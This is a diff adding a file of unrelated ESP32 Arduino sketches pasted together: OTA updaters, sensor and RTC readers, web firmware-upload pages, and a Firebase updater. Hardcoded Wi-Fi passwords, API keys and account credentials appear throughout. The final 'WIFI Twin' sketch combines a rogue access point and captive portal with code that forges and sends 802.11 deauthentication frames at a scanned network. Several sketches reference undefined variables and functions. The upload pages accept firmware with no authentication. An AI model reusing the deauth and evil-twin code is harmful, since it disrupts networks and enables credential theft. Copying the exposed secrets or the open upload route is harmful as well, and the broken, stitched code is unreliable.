@@ -1,0 +1,990 @@
+
+
+// OVert the Air Upload Code
+
+
+#include <WiFi.h>
+#include <ArduinoOTA.h>
+
+// Wi-Fi Credentials
+const char* ssid = "CUST";
+const char* password = "11223344";
+
+void setup() {
+  Serial.begin(115200);
+
+  // Connect to Wi-Fi
+  WiFi.begin(ssid, password);
+  Serial.print("Connecting to WiFi");
+  while (WiFi.status() != WL_CONNECTED) {
+    Serial.print(".");
+    delay(500);
+  }
+  Serial.println("\nConnected to WiFi");
+
+  // Begin OTA
+  ArduinoOTA.begin();
+  Serial.println("OTA Ready. IP address: ");
+  Serial.println(WiFi.localIP());
+}
+
+void loop() {
+  // Always call handle() in loop
+  ArduinoOTA.handle();
+
+  // Optional - your other code
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+// Bootloader Code
+
+
+#include <WiFi.h>
+#include <ArduinoOTA.h>
+#include <HTTPUpdate.h>
+
+void update();
+void setup()
+{
+  // put your setup code here, to run once:
+  pinMode(22, OUTPUT);
+  WiFi.begin("CUST", "11223344");
+ArduinoOTA.begin();
+
+}
+
+uint32_t updateCounter = 0;
+
+void loop()
+{
+  ArduinoOTA.handle();
+
+  // put your main code here, to run repeatedly:
+  digitalWrite(22, 1);
+  delay(250);
+  digitalWrite(22, 0);
+  delay(250);
+
+  if (WiFi.status() == WL_CONNECTED)
+  {
+    updateCounter++;
+    if (updateCounter > 20)
+    {
+      updateCounter = 0;
+      update();
+    }
+  }
+}
+
+String getChipId()
+{
+  String ChipIdHex = String((uint32_t)(ESP.getEfuseMac() >> 32), HEX);
+  ChipIdHex += String((uint32_t)ESP.getEfuseMac(), HEX);
+  return ChipIdHex;
+}
+
+void update()
+{
+  String url = "http://otadrive.com/deviceapi/update?";
+  url += "k=2f8652f4-2fbb-4d7b-8cec-8c85fcd1f3df";
+  url += "&v=1.0.0.1";
+  url += "&s=" + getChipId();
+
+  WiFiClient client;
+  httpUpdate.update(client, url, "1.0.0.2");
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//Temp & Humd Sensor 
+
+#include <Wire.h>
+
+#define SHT40_ADDR  0x44
+#define CMD_MEASURE_HIGH_PREC  0xFD
+#define pow 22
+#define gnd 19
+
+void setup() {
+  Serial.begin(115200);
+  Wire.begin(15, 2);  // SDA, SCL
+  pinMode(pow, OUTPUT); digitalWrite(pow, HIGH);
+  pinMode(gnd, OUTPUT); digitalWrite(gnd, LOW);
+
+  delay(1000);
+  Serial.println("Reading SHT40...");
+}
+
+void loop() {
+  Wire.beginTransmission(SHT40_ADDR);
+  Wire.write(CMD_MEASURE_HIGH_PREC);
+  Wire.endTransmission();
+  delay(10);  // Wait for measurement
+
+  Wire.requestFrom(SHT40_ADDR, 6);
+  if (Wire.available() == 6) {
+    uint16_t tempRaw = Wire.read() << 8 | Wire.read();
+    Wire.read();  // skip CRC
+    uint16_t humRaw = Wire.read() << 8 | Wire.read();
+    Wire.read();  // skip CRC
+
+    // Convert raw data to temperature and humidity
+    float temperature = -45 + 175 * ((float)tempRaw / 65535);
+    float humidity = 100 * ((float)humRaw / 65535);
+
+    Serial.print("Temp: ");
+    Serial.print(temperature);
+    Serial.print(" °C, Hum: ");
+    Serial.print(humidity);
+    Serial.println(" %");
+  } else {
+    Serial.println("Sensor not responding.");
+  }
+
+  delay(2000);
+}
+
+
+
+
+
+
+
+// RTC COde
+
+#include <Wire.h>
+
+#define DS1307_ADDRESS 0x68
+
+
+uint8_t bcdToDec(uint8_t val) {
+  return ((val / 16 * 10) + (val % 16));
+}
+
+void readRTC(byte &sec, byte &min, byte &hr, byte &day, byte &date, byte &month, byte &year) {
+  Wire.beginTransmission(DS1307_ADDRESS);
+  Wire.write(0x00); 
+  Wire.endTransmission();
+
+  Wire.requestFrom(DS1307_ADDRESS, 7);
+  sec   = bcdToDec(Wire.read() & 0x7F); 
+  min   = bcdToDec(Wire.read());
+  hr    = bcdToDec(Wire.read());
+  day   = bcdToDec(Wire.read());
+  date  = bcdToDec(Wire.read());
+  month = bcdToDec(Wire.read());
+  year  = bcdToDec(Wire.read());
+}
+
+
+
+void setup() {
+  Serial.begin(115200);
+  Wire.begin(0, 4);
+
+
+}
+
+void loop() {
+  byte sec, min, hr, day, date, month, year;
+  readRTC(sec, min, hr, day, date, month, year);
+
+  Serial.print("Time: ");
+  Serial.print(hr); Serial.print(":");
+  Serial.print(min); Serial.print(":");
+  Serial.print(sec);
+
+  Serial.print(" | Date: ");
+  Serial.print(date); Serial.print("/");
+  Serial.print(month); Serial.print("/");
+  Serial.print(2000 + year);
+
+  Serial.println();
+  delay(1000);
+}
+
+
+
+
+
+
+
+#include <Wire.h>
+
+#define DS1307_ADDRESS 0x68
+#define SHT40_ADDR  0x44
+#define CMD_MEASURE_HIGH_PREC  0xFD
+
+
+uint8_t bcdToDec(uint8_t val) {
+  return ((val / 16 * 10) + (val % 16));
+}
+
+void readRTC(byte &sec, byte &min, byte &hr, byte &day, byte &date, byte &month, byte &year) {
+  Wire.beginTransmission(DS1307_ADDRESS);
+  Wire.write(0x00); 
+  Wire.endTransmission();
+
+  Wire.requestFrom(DS1307_ADDRESS, 7);
+  sec   = bcdToDec(Wire.read() & 0x7F); 
+  min   = bcdToDec(Wire.read());
+  hr    = bcdToDec(Wire.read());
+  day   = bcdToDec(Wire.read());
+  date  = bcdToDec(Wire.read());
+  month = bcdToDec(Wire.read());
+  year  = bcdToDec(Wire.read());
+}
+
+
+bool readSensor(float &temp, float &hum) {
+  Wire.beginTransmission(SHT40_ADDR);
+  Wire.write(CMD_MEASURE_HIGH_PREC);
+  Wire.endTransmission();
+  delay(10);  
+
+  Wire.requestFrom(SHT40_ADDR, 6);
+  if (Wire.available() == 6) {
+    uint16_t tempRaw = Wire.read() << 8 | Wire.read();
+    Wire.read();  
+    uint16_t humRaw = Wire.read() << 8 | Wire.read();
+    Wire.read();  
+
+    temp = -45 + 175 * ((float)tempR / 65535);
+    hum = 100 * ((float)humR / 65535);
+    return true;
+  }
+  return false;
+}
+
+void setup() {
+  Serial.begin(115200);
+  Wire.begin(0, 4); 
+}
+
+void loop() {
+  float temp, hum;
+
+  if (readSensor(temp, hum)) {
+    Serial.print("Temp: ");
+    Serial.print(temp);
+    Serial.print(" °C, Hum: ");
+    Serial.print(hum);
+    Serial.println(" %");
+  } else {
+    Serial.println("Sensor not responding.");
+  }
+
+  byte sec, min, hr, day, date, month, year;
+  readRTC(sec, min, hr, day, date, month, year);
+
+  Serial.print("Time: ");
+  Serial.print(hr); Serial.print(":");
+  Serial.print(min); Serial.print(":");
+  Serial.print(sec);
+
+  Serial.print(" | Date: ");
+  Serial.print(date); Serial.print("/");
+  Serial.print(month); Serial.print("/");
+  Serial.print(2000 + year);
+
+  Serial.println();
+  delay(1000);
+}
+
+
+
+
+
+
+
+//OTA Firmware Updates
+
+
+/*
+  Rui Santos
+  Complete project details
+   - Arduino IDE: https://RandomNerdTutorials.com/esp32-ota-over-the-air-arduino/
+   - VS Code: https://RandomNerdTutorials.com/esp32-ota-over-the-air-vs-code/
+  
+  This sketch shows a Basic example from the AsyncElegantOTA library: ESP32_Async_Demo
+  https://github.com/ayushsharma82/AsyncElegantOTA
+*/
+
+#include <Arduino.h>
+#include <WiFi.h>
+#include <AsyncTCP.h>
+#include <ESPAsyncWebServer.h>
+#include <AsyncElegantOTA.h>
+
+const char* ssid = "REPLACE_WITH_YOUR_SSID";
+const char* password = "REPLACE_WITH_YOUR_PASSWORD";
+
+AsyncWebServer server(80);
+
+void setup(void) {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(ssid, password);
+  Serial.println("");
+
+  // Wait for connection
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+  }
+  Serial.println("");
+  Serial.print("Connected to ");
+  Serial.println(ssid);
+  Serial.print("IP address: ");
+  Serial.println(WiFi.localIP());
+
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send(200, "text/plain", "Hi! I am ESP32.");
+  });
+
+  AsyncElegantOTA.begin(&server);    // Start ElegantOTA
+  server.begin();
+  Serial.println("HTTP server started");
+}
+
+void loop(void) {
+
+}
+
+
+
+
+
+
+
+
+
+
+// ESP32 Bootloader Code
+
+
+#include <Arduino.h>
+#include <WiFi.h>
+#include <ESPAsyncWebServer.h>
+#include <AsyncTCP.h>
+#include <Update.h>
+
+const char* ssid = "CUST";
+const char* password = "11223344";
+
+AsyncWebServer server(80);
+
+
+const char* companyLogoURL = "https://encore.com.co/wp-content/uploads/2024/02/Encore-logo-footer.webp";  
+
+// ======= HTML: Home Page =======
+const char HOME_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head><title>ESP32 Control Panel</title></head>
+<body style="text-align: center; font-family: Arial;">
+  <img src="%LOGO%" alt="Company Logo" style="max-width: 200px;"><br><br>
+  <h2>Welcome to the ESP32 Web Server</h2>
+  <p>Device is running properly.</p>
+  <a href="/update"><button style="padding: 10px 20px; font-size: 16px;">Update Firmware</button></a>
+</body>
+</html>
+)rawliteral";
+
+// ======= HTML: OTA Update Page =======
+const char OTA_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head><title>ESP32 OTA Update</title></head>
+<body style="text-align: center; font-family: Arial;">
+  <img src="%LOGO%" alt="Company Logo" style="max-width: 500px;"><br><br>
+  <h2>OTA Firmware Upload</h2>
+  <form method="POST" action="/update" enctype="multipart/form-data">
+    <input type="file" name="update"><br><br>
+    <input type="submit" value="Upload Firmware">
+  </form><br>
+  <a href="/"><button style="padding: 8px 16px;">Home</button></a>
+</body>
+</html>
+)rawliteral";
+
+// LED blink setup
+#define LED_PIN 22
+unsigned long previousMillis = 0;
+const long interval = 1000;
+bool ledState = LOW;
+
+void initWiFi() {
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(ssid, password);
+  Serial.print("Connecting to WiFi");
+  while (WiFi.status() != WL_CONNECTED) {
+    Serial.print(".");
+    delay(1000);
+  }
+  Serial.println("\nConnected! IP Address: " + WiFi.localIP().toString());
+}
+
+// Helper to inject logo URL into HTML
+String processor(const String& var) {
+  if (var == "LOGO") return String(companyLogoURL);
+  return String();
+}
+
+void setupOTARoutes() {
+  server.on("/update", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send_P(200, "text/html", OTA_HTML, processor);
+  });
+
+  server.on("/update", HTTP_POST, [](AsyncWebServerRequest *request){
+    bool success = !Update.hasError();
+    request->send(200, "text/plain", success ? "Update Success. Rebooting..." : "Update Failed!");
+    delay(1000);
+    ESP.restart();
+  }, [](AsyncWebServerRequest *request, String filename, size_t index,
+        uint8_t *data, size_t len, bool final) {
+    if (!index) {
+      Serial.printf("Starting OTA: %s\n", filename.c_str());
+      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) Update.printError(Serial);
+    }
+    if (Update.write(data, len) != len) Update.printError(Serial);
+    if (final) {
+      if (Update.end(true)) Serial.printf("Update complete: %u bytes\n", index + len);
+      else Update.printError(Serial);
+    }
+  });
+}
+
+void setup() {
+  Serial.begin(115200);
+  pinMode(LED_PIN, OUTPUT);
+
+  initWiFi();
+  setupOTARoutes();
+
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send_P(200, "text/html", HOME_HTML, processor);
+  });
+
+  server.begin();
+}
+
+void loop() {
+  unsigned long currentMillis = millis();
+  if (currentMillis - previousMillis >= interval) {
+    previousMillis = currentMillis;
+    ledState = !ledState;
+    digitalWrite(LED_PIN, ledState);
+  }
+}
+
+
+
+
+
+
+//Bootloader with LED Control
+
+
+#include <Arduino.h>
+#include <WiFi.h>
+#include <ESPAsyncWebServer.h>
+#include <AsyncTCP.h>
+#include <Update.h>
+
+const char* ssid = "CUST";
+const char* password = "11223344";
+
+AsyncWebServer server(80);
+
+#define LED_PIN 22
+bool ledState = false;
+
+// ======= HTML: Home Page =======
+const char HOME_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+  <title>ESP32 Control Panel</title>
+  <style>
+    body { text-align: center; font-family: Arial; background-color: #f9f9f9; }
+    .led-button {
+      background-color: #e74c3c;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      font-size: 20px;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .led-on { background-color: #27ae60; }
+    .led-off { background-color: #e74c3c; }
+  </style>
+</head>
+<body>
+  <img src="https://encore.com.co/wp-content/uploads/2024/02/Encore-logo-footer.webp" alt="Company Logo" style="max-width: 1000px;"><br><br>
+  <h2>ESP32 Web Control Panel</h2>
+  <p>Device is running properly.</p>
+  <button id="ledBtn" class="led-button led-off" onclick="toggleLED()">Turn ON</button><br><br>
+  <a href="/update"><button style="padding: 10px 20px; font-size: 16px;">Update Firmware</button></a>
+
+  <script>
+    function toggleLED() {
+      fetch("/toggle")
+        .then(response => response.text())
+        .then(state => {
+          let btn = document.getElementById("ledBtn");
+          if (state === "ON") {
+            btn.innerText = "Turn OFF";
+            btn.classList.remove("led-off");
+            btn.classList.add("led-on");
+          } else {
+            btn.innerText = "Turn ON";
+            btn.classList.remove("led-on");
+            btn.classList.add("led-off");
+          }
+        });
+    }
+  </script>
+</body>
+</html>
+)rawliteral";
+
+// ======= HTML: OTA Update Page =======
+const char OTA_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head><title>ESP32 OTA Update</title></head>
+<body style="text-align: center; font-family: Arial;">
+  <img src="https://encore.com.co/wp-content/uploads/2024/02/Encore-logo-footer.webp" alt="Company Logo" style="max-width: 1000px;"><br><br>
+  <h2>OTA Firmware Upload</h2>
+  <form method="POST" action="/update" enctype="multipart/form-data">
+    <input type="file" name="update"><br><br>
+    <input type="submit" value="Upload Firmware">
+  </form><br>
+  <a href="/"><button style="padding: 8px 16px;">Home</button></a>
+</body>
+</html>
+)rawliteral";
+
+void initWiFi() {
+  WiFi.begin(ssid, password);
+  Serial.print("Connecting to WiFi");
+  while (WiFi.status() != WL_CONNECTED) {
+    Serial.print(".");
+    delay(1000);
+  }
+  Serial.println("\nConnected! IP Address: " + WiFi.localIP().toString());
+}
+
+void setupOTARoutes() {
+  server.on("/update", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send_P(200, "text/html", OTA_HTML);
+  });
+
+  server.on("/update", HTTP_POST, [](AsyncWebServerRequest *request){
+    bool success = !Update.hasError();
+    request->send(200, "text/plain", success ? "Update Success. Rebooting..." : "Update Failed!");
+    delay(1000);
+    ESP.restart();
+  }, [](AsyncWebServerRequest *request, String filename, size_t index,
+        uint8_t *data, size_t len, bool final) {
+    if (!index) {
+      Serial.printf("Starting OTA: %s\n", filename.c_str());
+      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) Update.printError(Serial);
+    }
+    if (Update.write(data, len) != len) Update.printError(Serial);
+    if (final) {
+      if (Update.end(true)) Serial.printf("Update complete: %u bytes\n", index + len);
+      else Update.printError(Serial);
+    }
+  });
+}
+
+void setup() {
+  Serial.begin(115200);
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, LOW);  // Initially off
+
+  initWiFi();
+  setupOTARoutes();
+
+  // Home page
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send_P(200, "text/html", HOME_HTML);
+  });
+
+  // Handle LED toggle
+  server.on("/toggle", HTTP_GET, [](AsyncWebServerRequest *request){
+    ledState = !ledState;
+    digitalWrite(LED_PIN, ledState ? HIGH : LOW);
+    request->send(200, "text/plain", ledState ? "ON" : "OFF");
+  });
+
+  server.begin();
+}
+
+void loop() {
+  // Nothing needed here — handled by AJAX requests
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//ota
+
+
+
+
+
+/*****************************************************************************************************************************
+**********************************    Author  : Ehab Magdy Abdullah                      *************************************
+**********************************    Linkedin: https://www.linkedin.com/in/ehabmagdyy/  *************************************
+**********************************    Youtube : https://www.youtube.com/@EhabMagdyy      *************************************
+******************************************************************************************************************************/
+
+// Include Libraries
+#include <WiFi.h>
+#include <Firebase_ESP_Client.h>
+#include <HTTPClient.h>
+#include <Update.h>
+
+// WiFi credentials
+#define WIFI_SSID "CUST"
+#define WIFI_PASSWORD "11223344"
+
+// Firebase Project credentials
+#define FIREBASE_API_KEY "AIzaSyCXPtzW8B6JquX6E2Z4hBv-98xnjIit98Q"
+#define FIREBASE_RTDB_URL "https://iot-project-49ec2-default-rtdb.firebaseio.com/"
+#define FIREBASE_USER_EMAIL "cust@gmail.com"
+#define FIREBASE_USER_PASSWORD "11223344"
+
+// Variables for Receiving Version and Update URL
+String Update_Version = "";
+String Firebase_Firmawre_Update_URL = "";
+
+// Current firmware version
+#define CURRENT_FIRMWARE_VERSION "1.0"
+
+// Firebase instance
+FirebaseData fbdo;
+FirebaseAuth auth;
+FirebaseConfig config;
+
+void setup()
+{
+    Serial.begin(115200);
+
+    // Connect to Wi-Fi
+    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
+    while (WiFi.status() != WL_CONNECTED) {
+      delay(1000);
+      Serial.println("Connecting to WiFi...");
+    }
+    Serial.println("Connected to WiFi");
+
+    // Configure Firebase
+    config.api_key = FIREBASE_API_KEY;
+    config.database_url = FIREBASE_RTDB_URL;
+    auth.user.email = FIREBASE_USER_EMAIL;
+    auth.user.password = FIREBASE_USER_PASSWORD;
+
+    // Initialize Firebase
+    Firebase.begin(&config, &auth);
+    Firebase.reconnectWiFi(true);
+}
+
+bool CheckForUpdate()
+{
+    if (Firebase.ready())
+    {
+        // Read Available update Version Number
+        if(Firebase.RTDB.getString(&fbdo, "/update/version"))
+        {
+            Update_Version = fbdo.stringData();
+            Serial.println(Update_Version);
+
+            char update_version = Update_Version.compareTo(CURRENT_FIRMWARE_VERSION);
+            
+            // if Version Higher than current version
+            if(update_version > 0)
+            {
+                // Read update URL
+                if(Firebase.RTDB.getString(&fbdo, "/update/url"))
+                {
+                    Firebase_Firmawre_Update_URL = fbdo.stringData();
+                    Serial.println(Firebase_Firmawre_Update_URL);
+                    return true;
+                }
+                else{ Serial.println(fbdo.errorReason().c_str()); }
+            }
+            else if(0 == update_version){ Serial.println("Application is Up To Date"); }
+            else{ Serial.println("Firebase version is old!"); }
+
+        }
+        else{ Serial.println(fbdo.errorReason().c_str()); }
+    }
+
+    return false;
+}
+
+void downloadAndUpdateFirmware()
+{
+    // Get the download URL from Firebase
+    Serial.print("Firmware URL: ");
+    Serial.println(Firebase_Firmawre_Update_URL);
+
+    HTTPClient http;
+    http.begin(Firebase_Firmawre_Update_URL);
+
+    int httpCode = http.GET();
+
+    if (httpCode == HTTP_CODE_OK)
+    {
+      WiFiClient& client = http.getStream();
+      int firmwareSize = http.getSize();
+      Serial.print("Firmware Size: ");
+      Serial.println(firmwareSize);
+
+      if (Update.begin(firmwareSize))
+      {
+          size_t written = Update.writeStream(client); //////////// Takes Time
+
+          if (Update.size() == written)
+          {
+              Serial.println("Update successfully completed. Rebooting...");
+
+              if (Update.end())
+              {
+                  Serial.println("Rebooting...");
+                  ESP.restart();
+              } 
+              else 
+              {
+                  Serial.print("Update failed: ");
+                  Serial.println(Update.errorString());
+              }
+          }
+          else
+          {
+              Serial.println("Not enough space for OTA.");
+          }
+      } 
+        else
+        {
+            Serial.println("Failed to begin OTA update.");
+        }
+    }
+    else
+    {
+        Serial.print("Failed to download firmware. HTTP code: ");
+        Serial.println(httpCode);
+    }
+
+    http.end();
+}
+
+void loop()
+{
+    delay(1000);
+    Serial.println("> Version 1.0");
+    delay(1000);
+    
+    // if there is a new update, download it
+    if(true == CheckForUpdate()){ downloadAndUpdateFirmware() ; }
+
+    delay(5000);
+}
+
+
+
+
+
+
+
+
+// WIFI Twin
+
+
+
+
+#include <Arduino.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <esp_wifi.h>
+
+// No need for user_interface.h on ESP32
+
+typedef struct {
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+} _Network;
+
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 1, 1);
+DNSServer dnsServer;
+WebServer webServer(80);
+
+_Network _networks[16];
+_Network _selectedNetwork;
+
+void clearArray() {
+  for (int i = 0; i < 16; i++) {
+    _Network n;
+    _networks[i] = n;
+  }
+}
+
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += '0';
+    str += String(b[i], HEX);
+    if (i < size - 1) str += ":";
+  }
+  return str;
+}
+
+// Initialize WiFi in AP mode
+void setup() {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255,255,255,0));
+  WiFi.softAP("WiPhi_34732", "d347h320");
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+  
+  webServer.on("/", handleIndex);
+  webServer.on("/result", handleResult);
+  webServer.on("/admin", handleAdmin);
+  webServer.onNotFound(handleIndex);
+  webServer.begin();
+  
+  // Optional: enable promiscuous mode if needed
+  // esp_wifi_set_promiscuous(true);
+  // esp_wifi_set_promiscuous_rx_cb(&your_callback);
+}
+
+void performScan() {
+  int n = WiFi.scanNetworks();
+  clearArray();
+  for (int i = 0; i < n && i < 16; ++i) {
+    _Network net;
+    net.ssid = WiFi.SSID(i);
+    WiFi.BSSID(i, net.bssid);
+    net.ch = WiFi.channel(i);
+    _networks[i] = net;
+  }
+}
+
+// Function to send raw packet (deauth) on ESP32
+esp_err_t sendDeauthPacket(const uint8_t* packet, size_t len) {
+  wifi_pkt_tx_ctrl_t ctrl = {0};
+  ctrl.write = true;
+  ctrl.ampdu = false;
+  ctrl.scrambler = false;
+  ctrl.channel = _selectedNetwork.ch;
+
+  // Get the WiFi handle
+  wifi_interface_t ifx = WIFI_IF_STA; // or WIFI_IF_AP as needed
+  // Send raw packet using esp_wifi_80211_tx
+  return esp_wifi_80211_tx(ifx, packet, len, false);
+}
+
+// Example of constructing and sending deauth packet
+void sendDeauth() {
+  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00,
+                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00,
+                                0x00, 0x01, 0x00};
+
+  memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
+  memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
+  deauthPacket[24] = 1; // reason code
+
+  // Send deauth packet via esp_wifi_80211_tx
+  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+  // For broadcast, use WIFI_IF_AP or WIFI_IF_STA depending on your mode
+}
+
+unsigned long now = 0;
+unsigned long wifinow = 0;
+unsigned long deauth_now = 0;
+
+uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+
+void loop() {
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+
+  if (deauthing_active && millis() - deauth_now >= 1000) {
+    // Switch channel
+    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
+    sendDeauth();
+    deauth_now = millis();
+  }
+
+  if (millis() - now >= 15000) {
+    performScan();
+    now = millis();
+  }
+
+  if (millis() - wifinow >= 2000) {
+    if (WiFi.status() != WL_CONNECTED) {
+      Serial.println("BAD");
+    } else {
+      Serial.println("GOOD");
+    }
+    wifinow = millis();
+  }
+}
